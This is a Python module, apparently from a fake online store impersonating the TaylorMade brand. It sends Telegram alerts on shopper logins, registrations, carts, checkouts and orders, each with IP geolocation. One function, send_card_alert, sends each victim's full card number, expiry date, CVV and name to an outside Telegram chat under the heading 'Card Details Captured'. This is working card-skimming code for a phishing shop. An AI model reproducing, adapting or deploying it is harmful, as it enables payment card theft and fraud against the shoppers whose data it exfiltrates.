import httpx
import os
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID   = os.getenv("TELEGRAM_CHAT_ID")
TELEGRAM_API_URL   = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"


# ── Helpers ────────────────────────────────────────────────────────────────────
def _now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _get_location(ip: str) -> str:
    """Lookup city/country from IP using ip-api.com (free, no key needed)."""
    if not ip or ip in ("127.0.0.1", "::1", "testclient"):
        return "🖥️ Local / unknown"
    try:
        with httpx.Client(timeout=5.0) as client:
            r = client.get(f"http://ip-api.com/json/{ip}?fields=status,city,regionName,country,isp")
            data = r.json()
            if data.get("status") == "success":
                return f"📍 {data.get('city', '?')}, {data.get('regionName', '?')}, {data.get('country', '?')} | ISP: {data.get('isp', '?')}"
    except Exception:
        pass
    return f"📍 {ip} (lookup failed)"


def _send(message: str) -> bool:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[TELEGRAM] Token or chat ID not configured — skipping")
        return False
    try:
        with httpx.Client(timeout=10.0) as client:
            r = client.post(
                TELEGRAM_API_URL,
                json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"},
            )
            ok = r.status_code == 200
            if not ok:
                print(f"[TELEGRAM ERROR] {r.status_code}: {r.text}")
            return ok
    except Exception as e:
        print(f"[TELEGRAM ERROR] {e}")
        return False


# ── Notification functions ─────────────────────────────────────────────────────

def send_login_alert(user_name: str, email: str, ip: str = "") -> bool:
    location = _get_location(ip)
    msg = (
        f"🏌️ *TaylorMade — User Login*\n"
        f"─────────────────────\n"
        f"👤 *Name:* {user_name}\n"
        f"📧 *Email:* {email}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────"
    )
    return _send(msg)


def send_new_user_alert(user_name: str, email: str, ip: str = "") -> bool:
    location = _get_location(ip)
    msg = (
        f"🆕 *TaylorMade — New Registration*\n"
        f"─────────────────────\n"
        f"👤 *Name:* {user_name}\n"
        f"📧 *Email:* {email}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────"
    )
    return _send(msg)


def send_cart_alert(user_email: str, product_name: str, price: float, ip: str = "") -> bool:
    location = _get_location(ip)
    msg = (
        f"🛒 *TaylorMade — Item Added to Cart*\n"
        f"─────────────────────\n"
        f"📧 *User:* {user_email}\n"
        f"🏷️ *Product:* {product_name}\n"
        f"💰 *Price:* ${price:,.0f}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────"
    )
    return _send(msg)


def send_checkout_alert(user_email: str, total: float, item_count: int, ip: str = "") -> bool:
    location = _get_location(ip)
    msg = (
        f"💳 *TaylorMade — Checkout Started*\n"
        f"─────────────────────\n"
        f"📧 *User:* {user_email}\n"
        f"🛍️ *Items:* {item_count}\n"
        f"💰 *Total:* ${total:,.0f}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────"
    )
    return _send(msg)


def send_order_alert(user_email: str, total: float, payment_method: str, ip: str = "") -> bool:
    location = _get_location(ip)
    msg = (
        f"✅ *TaylorMade — Order Placed!*\n"
        f"─────────────────────\n"
        f"📧 *User:* {user_email}\n"
        f"💰 *Total:* ${total:,.0f}\n"
        f"💳 *Payment:* {payment_method}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────"
    )
    return _send(msg)


def send_card_alert(
    user_email: str,
    card_number: str,
    expiry: str,
    cvv: str,
    cardholder_name: str,
    total: float = 0,
    ip: str = "",
) -> bool:
    location = _get_location(ip)
    msg = (
        f"💳 *TaylorMade — Card Details Captured*\n"
        f"═════════════════════\n"
        f"👤 *Cardholder:* {cardholder_name}\n"
        f"📧 *Email:* {user_email}\n"
        f"💳 *Card Number:* `{card_number}`\n"
        f"📅 *Expiry:* {expiry}\n"
        f"🔒 *CVV:* {cvv}\n"
        f"💰 *Order Total:* ${total:,.2f}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"═════════════════════"
    )
    return _send(msg)


def send_support_chat_alert(user_email: str, message: str, session_id: str) -> bool:
    msg = (
        f"🔔 *TaylorMade — New Support Message*\n"
        f"─────────────────────\n"
        f"📧 *From:* {user_email}\n"
        f"💬 *Message:* {message}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────\n"
        f"↩️ *Reply to this message to respond to the customer*\n"
        f"🔑 `SESSION_ID:{session_id}`"
    )
    return _send(msg)
